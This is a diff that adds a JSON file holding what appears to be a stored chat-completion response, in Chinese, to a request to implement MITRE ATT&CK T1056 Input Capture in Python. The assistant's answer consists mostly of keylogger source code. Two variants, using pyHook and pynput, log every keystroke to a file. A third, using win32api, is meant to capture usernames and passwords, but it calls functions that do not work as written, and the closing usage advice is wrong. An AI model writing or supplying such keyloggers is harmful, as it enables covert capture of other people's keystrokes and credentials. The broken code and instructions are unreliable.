@@ -1,0 +1,21 @@
+{
+  "id":"chatcmpl-8MeKy1qitOhymbcaJO20uL4fdali1",
+  "object":"chat.completion",
+  "created":1700408964,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現]\n\n使用Python撰寫T1056的Input Capture的功能可以有以下幾種方式：\n\n方法一：使用pyHook套件來進行鍵盤監聽，並將輸入的按鍵資訊輸出到檔案中。\n\n```python\nimport pyHook\nimport pythoncom\n\ndef OnKeyboardEvent(event):\n    if event.Ascii:\n        with open('keylogs.txt', 'a') as f:\n            f.write(chr(event.Ascii))\n    return True\n\nhook_manager = pyHook.HookManager()\nhook_manager.KeyDown = OnKeyboardEvent\nhook_manager.HookKeyboard()\npythoncom.PumpMessages()\n```\n\n方法二：使用pynput套件來進行鍵盤監聽，並將輸入的按鍵資訊輸出到檔案中。\n\n```python\nfrom pynput import keyboard\n\ndef on_press(key):\n    with open('keylogs.txt', 'a') as f:\n        f.write(str(key))\n\nwith keyboard.Listener(on_press=on_press) as listener:\n    listener.join()\n```\n\n方法三：使用win32api套件來進行Windows API的hooking，並擷取具有輸入驗證憑證的API呼叫。\n\n```python\nimport win32api\nimport win32con\n\ndef hook_func(nCode, wParam, lParam):\n    if nCode >= 0:\n        params = win32api.GetParameter(lParam, 1)\n        if params == 'username' or params == 'password':\n            with open('api_logs.txt', 'a') as f:\n                f.write(params + '\\n')\n    return win32api.CallNextHookEx(None, nCode, wParam, lParam)\n\nhook_id = win32api.SetWindowsHookEx(win32con.WH_KEYBOARD_LL, hook_func, win32api.GetModuleHandle(None), 0)\nwin32api.PumpMessages()\nwin32api.UnhookWindowsHookEx(hook_id)\n```\n\n這些程式碼分別使用了pyHook、pynput、win32api套件來實現鍵盤監聽和API hooking的功能。其中，按鍵監聽的結果會輸出到keylogs.txt檔案中，API hooking的結果會輸出到api_logs.txt檔案中。請注意在使用win32api套件時，需要安裝`pywin32`模組。\n\n撰寫完程式碼後，你可以透過調用這些函數來執行Input Capture的功能，例如呼叫`OnKeyboardEvent()`來開始鍵盤監聽。"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":936,
+    "completion_tokens":659,
+    "total_tokens":1595
+  }
+}
